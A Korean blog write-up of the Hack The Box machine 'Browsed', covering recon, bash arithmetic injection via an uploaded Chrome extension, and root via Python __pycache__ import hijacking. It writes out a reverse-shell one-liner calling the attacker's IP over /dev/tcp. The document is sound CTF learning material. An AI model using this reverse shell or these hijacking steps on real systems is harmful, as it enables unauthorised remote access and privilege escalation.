---
title: "[HTB] Browsed (Medium_Linux)"
date: 2026-01-15 11:46:00 +09:00
categories: [hacking, saturnx operators, Linux]
tags: [Hack The Box, Medium]
password: "20260115"
---

## 시작에 앞서

![Browsed](https://github.com/user-attachments/assets/bfff44c8-04e1-4452-87b2-8196bc57a898)

이번에는 **Browsed**라고 하는 Medium 난이도의 Active 머신으로 어떤걸 풀어볼까 하는데 `Arena` 로 등록된 머신이기에 한번 해봤다.

![Arena 였던것](https://github.com/user-attachments/assets/72ab31f8-3281-479f-be0a-d755a4448367)

~~아니 근데 이걸 작성하고 있는 지금은 또 Arena에서 Live로 바뀌었다.~~

|구분|Arena (지난주 토 ~ 어제)|Live (오늘 ~)|
|:--:|:--:|:--:|
|상태|따끈따끈한 신상 (Seasons 경쟁 중)|일반 Active 머신 (안정화 단계)|
서버|Release Arena (신규 전용 서버)|Standard / Free (일반 공용 서버)|
|접속 권한|누구나 (Free 포함)|누구나 (Free 포함)|
|바뀐 이유|출시 후 5일이 지나 신규 기간이 종료됨|이제 일반 서버로 이관됨|

**Live**와 **Arena**는 위와 같은 차이가 있다고 한다.

솔직히 요거 푸는데 2일동안은 삽질만 하다가 비로소 4일차에 풀어냈다는 이야기 ㅎ

## 정찰 및 정보 수집 (Reconnaissance & Enumeration) 

![nmap](https://github.com/user-attachments/assets/fb3cd189-54bc-4e74-a737-b53e940af7ab)

nmap의 결과를 보면 `22/ssh`와 `80/http`가 있고 페이지 이름이 `Browsed`라고 한다. `nginx 1.24.0`버전이고....

직접 들어가보자.
![Browsed page](https://github.com/user-attachments/assets/3906df82-3820-46bb-a403-281fc42fce03)

페이지에 접속해보니 `Browsed.htb`라는 사이트와 크롬 확장프로그램관련 사이트라는 소개를 볼 수 있다.

![addetchosts](https://github.com/user-attachments/assets/9df0ff00-0f89-42fa-989d-8b2abb22ba9a)

`/etc/hosts`에 `browsed.htb`를 추가했고 다시 더 살펴보자.

![mainpage1](https://github.com/user-attachments/assets/4e477cfe-2014-4a52-8175-cfacad229c07)

![mainpage2](https://github.com/user-attachments/assets/442bd1bd-d544-4c0a-aa1d-0f3252f274b9)

내가 만든 extention을 올리면 그걸 자동으로 실행하고 확인해준다고 한다. 뭔가 공유하고 쉽게 만들 수 있고 한 내용도 있긴 한데... 다른 페이지를 찾아봐도 딱히?

dirsearch로 찾아봐도 특별히 눈에 띄는 취약점이나 숨겨진 경로는 없었다.

![update](https://github.com/user-attachments/assets/1cc49eb2-acc4-44d2-8ad9-d1d1153a6618)

`Sample`에 들어가보면 위와 같이 세가지 예시 파일이 있다.

`Fontify`, `ReplaceImages`, `Timer`

![Sample fontify](https://github.com/user-attachments/assets/35c9d232-a4be-4259-bdc5-72a9f7a73964)

fontify를 다운받아 열어보니 `manifest.json`, `style.css`, `popup.js`, `content.js`, `popup.html`이 있다.

![maniandcontent](https://github.com/user-attachments/assets/4ae4abeb-0e06-41de-89fa-2ab086783362)

중요해보이는 `manifest.json`과 `content.js`를 열어보니 `manifest_version`이 3이라는 것을 알 수 있었다.

참고로 난 어떻게 기본 구조가 되는지 몰라서 

[웹 앱 매니페스트 manifest.json 를 작성해보자.
by. 365kim](https://365kim.tistory.com/169)

[크롬 확장프로그램 만들기 part.1 (계기, 디자인&기획, 기본 준비 단계, 참고 문서) by. JOOLOG](https://youngsimi.tistory.com/entry/%ED%81%AC%EB%A1%AC-%ED%99%95%EC%9E%A5%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%A8-%EB%A7%8C%EB%93%A4%EA%B8%B0-part1-%EA%B3%84%EA%B8%B0-%EB%94%94%EC%9E%90%EC%9D%B8%EA%B8%B0%ED%9A%8D-%08%EA%B8%B0%EB%B3%B8-%EC%A4%80%EB%B9%84-%EB%8B%A8%EA%B3%84-%EC%B0%B8%EA%B3%A0-%EB%AC%B8%EC%84%9C)

의 내용을 참고해 공부했다.

![업로드 부분](https://github.com/user-attachments/assets/f39c5fab-b1fa-4494-832c-509081ae3bfe)

그리고 페이지의 `Update Extension`을 들어가보면 아까 다운로드한 예시 처럼 `.zip`의 형태로 파일을 업로드 할 수 있게 되어있다.

일단은 뭐 어떻게 작동하는지 모르니까 난 예시에서 다운받은 파일을 바로 그냥 올려봤다.

![output of extention](https://github.com/user-attachments/assets/8d6254e5-70ea-4dce-8745-ed2d90e6e26a)

그리고 그 결과 나온 output을 읽어보다 많은 오류 로그중에 (진짜 진짜 많다) `http://browsedinternals.htb` 라는 주소를 발견 할 수 있었다!

![etchosts2](https://github.com/user-attachments/assets/01fbfed3-cca2-421f-8425-abc5f6435558)

근데 nmap을 스캔했을 때에는 `browsed.htb`만 존재했었으니 추가적으로 로그에서 발견한 `browsedinternals.htb` 도메인도 `/etc/hosts`에 추가해 주었다. 이로써 하나의 IP에 두 개의 도메인이 매핑된 상태가 되었다.

![againnmap](https://github.com/user-attachments/assets/78b37dd8-e53b-4298-b24a-3ffd3d6507de)

그리고 다시 nmap을 진행했다... 만 사실 이거 할 필요 없다. 왜냐면 어쩌피 같은 IP주소를 기반으로 스캔하는 거다보니 굳이?

다만 Host 헤더가 뭐라고 나올까 하여 돌려봤다. 그리고 아까와 달리 이번에는 `Gitea`로 만들어진 페이지가 발견되었다.

메인 도메인이 `browsed.htb`이고 서브 도메인이 `browsedinternals.htb`가 되는 셈.

![gitea](https://github.com/user-attachments/assets/29257465-fd1b-42db-b8b7-67f76d259a02)

들어가보니 Gitea라고 하는 마치 github와 비슷한 역할을 하는 페이지를 볼 수 있었다.

공식 gitea 문서는 [Gitea.com](https://about.gitea.com/) 여기로.

![버전과 레포](https://github.com/user-attachments/assets/750a19a8-2ae9-492d-ac8b-0038e226cfb8)

`explore`로 들어가보니 딱 하나의 larry가 만든 레포를 볼 수 있다. 그리고 gitea의 버전이 1.24.5라는 것 까지.

![레포 안](https://github.com/user-attachments/assets/71c4f21b-8394-4773-b17b-1cdbc29293e2)

레포 안에 들어가보니 `backups`, `files`, `log`, `app.py`, `routines.sh`가 있었다.

솔직이 이전 Easy 문제들 생각해서 여기 나오는 backups에 뭔가 정보가 있거나 과거 commit 정보에 민감한 정보, 혹은 log에라도 뭔가있을줄 알았는데 log는 진짜 로그 정보만 있고 backups에는 텅 빈 백업 파일만, 다른 소스 코드에는 취약한 부분이 안 보였기에 진짜 여기서 삽질을 많이 했다. (내가 찾던건 하드코딩된 민감한 정보들이었는데.... 여기가 타겠이었...)

처음으론 gitea의 버전 정보를 찾아보며 취약점이 있을까 뒤져보기도 하고, dirsearch로 페이지 싹 뒤져보거나 gitea를 둘러보고 회원가입은 안되서 불가(내부에서 회원가입이 있기는 한데 이게 내부 섭 도메인이라 그런듯? 정확한건 찾아봐야함)였기에 거진 2-3일간 여기서 멈춰버렸다.

## 초기 침투 (Initial Foothold / Exploitation)

![approute](https://github.com/user-attachments/assets/547da4a9-eb79-432d-9dbd-d8ce235e1bb0)

프로그램 내용에서 `app.py`를 읽어보기만 하고 그냥 넘어갔었는데 삽질을 한 뒤에 다시 찾아와 코드를 자세히 읽어보며 분석을 해보니 `@app.route` 부분에 `./routines.sh`라는 쉘 코드를 실행시켜주는 것을 확인할 수 있었다.

여기서 바로 shell을 실행시킬 수 있었으면 좋으련만 그러기 위해서는 `shell=True`가 쓰여있어야 가능하기에 이제 쉘 코드를 읽어보기 시작했다.

![routinessh](https://github.com/user-attachments/assets/e0e300f3-015a-421c-9303-9374100c11b4)

긴 쉘 스크립트가 있는데 여기서 `if [[ "$1" -eq 0 ]];` 부분이 산술 표현식 주입 (Arithmetic Expression Injection)이 가능하다고 한다.

이것이 무엇인고 하니,

![산술 표현식 주입](https://github.com/user-attachments/assets/68930cc0-d832-4010-9da5-774908ebe121)

이라고 한다.

으흠 그니까 bash 스크립트에서 `-eq`가 숫자로 해석하려는데 그 안에 `"우언가 계산할거"`가 있으면 그걸 실행시켜버린다는 그런 취약점이다. 만...

이게 있는 표현인가?

![있나봄](https://github.com/user-attachments/assets/b0078808-c97a-4aa1-8572-001e0356e669)

있는 표현인가보다... 아마도?

허튼 우리는 이 부분에 뭔가 추가해서 Bash가 인자로 넣기 전에 인자 안에 명령어를 실행해버리는 그런 취약점이다.

그러므로 

![manifest](https://github.com/user-attachments/assets/54875258-21ee-4aa2-a6d4-bc5038f8a395)

다시 업로드할 두 chrome extention? 파일을 만들고 `bash -i >& /dev/tcp/10.10.14.184/4444 0>&1` 가 들어간 리버스 쉘을 만들어 내 컴퓨터의 서버에서 다운받을 수 있게 했다.

여기서 좀 뭔가 평소의 페이로드랑 다르게 더 긴데 그 이유랄까 

처음에는 그냥 base64인코딩을 했더니 그 내부에 `/`나 `+`가 있었는지 디렉토리로 구분되어 자꾸 문제가 생겨서 공백으로 교체하는 부분을 추가했다.

그리고 혹시 진짜 혹시 몰라서 bash에 문제가 생기지 않게 `%20(공백)`이나 `%7C`등을 넣었다.

![reverse](https://github.com/user-attachments/assets/1407036e-2ce4-4078-86c7-88f970d65d79)

그렇게 리버스 쉘 성공! `larry`의 계정을 얻는데 성공했다.

![usertxt](https://github.com/user-attachments/assets/5f412051-c652-4c20-a0c1-2179ce67e5b1)

그렇게 플래그를 찾을 수 있었다!

## 권한 상승 (Privilege Escalation) 

솔직히 뭐랄까.. 내가 소스코드 분석을 많이 안해보기도 했고 코딩은 하긴 했다만 취약점 찾는걸 안해봤어서 뭔가 초기 침투 과정이 훨씬 더 오래걸리고 삽질을 많이 했었다.

![sudol](https://github.com/user-attachments/assets/5901cb01-36a4-4bda-af63-1d3a0564ccf8)

이젠 거의 관례나 마찬가지인 `sudo -l`을 하면서 `/opt/extensiontool/extention_tool.py`라는 스크립트가 발견되었다.

![코드 분석](https://github.com/user-attachments/assets/33bd8b5e-2d36-40fe-8935-3187a687b201)

그리고 어쩌피 이 스크립트는 인터넷에 검색해도 많이 사용되거나 한 코드가 아니라고 확인되어 이번에는 실수하지 않고 꼼꼼히 코드를 분석하기 시작했고 생각보다 가장 처음 부분이 포인트였다.

`import extension_utils` 즉 모듈이 있는 `__pycache__` 디렉토리의 권한을 확인해보니 `drwxrwxrwx` 즉 `777` 권한이었다. 세상에.

아니 솔직히 이것도 몰라서 ㅋㅋㅋ 제 선생에게 여기서 제가 도대체 뭘 보아야 합니까 하고 물어봐서 어디를 살펴볼지 찾아냈다.

`__pycache__`가 무엇인지에 대해서는 [Python의 pycache 완벽 이해: 알아야 할 모든 것 by. Kana Mikami](https://docs.kanaries.net/ko/topics/Python/pycache)를 읽어보면 좋다.

우리가 여기서 진행할 것은 바로! `Python Import Hijacking`이다.

[Privilege Escalation: python library hijacking / Neu@security-blog](https://neutrinox4b1.tistory.com/95)

위를 참고해 공부하면 좋다.

그렇기에 우리는 `extension_utils`의 `.pyc` 파일을 우리의 루트로 올라가는 코드로 바꿔치기를 하면 되는데 이게 그냥 바꿔치기 해버리면 `헤더 정보`가 맞지 않는다며 실행이 안되기에 헤더 이식 과정까지 하나의 코드로 구현했다.

![실행](https://github.com/user-attachments/assets/eac4c3a1-5328-4b38-b926-2f4e618541a8)

> 1. larry의 계정으로 `extention_tool.py`를 한번 실행시키자.

![binbash](https://github.com/user-attachments/assets/fd88de12-bb26-4210-9dba-07874358f8d5)

> 2. python 권한 상승 파일을 만들어 컴파일해 `.pyc` 파일을 만들자.

![헤더 변조](https://github.com/user-attachments/assets/98085d7e-534a-4d7a-963e-fe36460e3eaf)

> 1. 그 후 정상 헤더를 가져와 내가 만든 악성 코드에 넣으면 된다. 그리고 난 그건 파이썬 코드로 짜서 진행했다.

그리고 다시 sudo를 넣어서 extention_tool.py를 실행 하면?

![루트 얻기 성공](https://github.com/user-attachments/assets/252fa2e7-97c4-4b23-905c-30e461781123)

루트 얻기 성공!!

## 마치며

![Browsed has been Pwned](https://github.com/user-attachments/assets/cc6b9445-79ea-429a-8074-85aba8e4081a)

이번 문제를 풀면서 점점 그저 스크립트를 가져와 쓰는 것이 아니라 소스 코드를 분석하고 그에 따른 활용 방안을 공부하여 머신을 해결해 나가는 진짜 해킹에 좀 더 가까워진 느낌이라 기분이 좋다.

이번건 Writeup도 없거니와 지금까지 풀던 느낌이랑은 또 달라서 풀고나서는 꽤나 재밌는 문제였다. 풀고 나서는...

SSRF와 Bash 취약점, 파이썬 바이트 코드 조작까지, Gitea 웹사이트 자체에서 눈이 팔리지만 않았다면 시간을 많이 안썼을지도? 그래도 확실히 `Think Out Side the Box` 가 얼마나 중요한 말인지 한번 더 생각하게 된 문제였다. 하나에 매몰되지 말기!

Happy Hacking!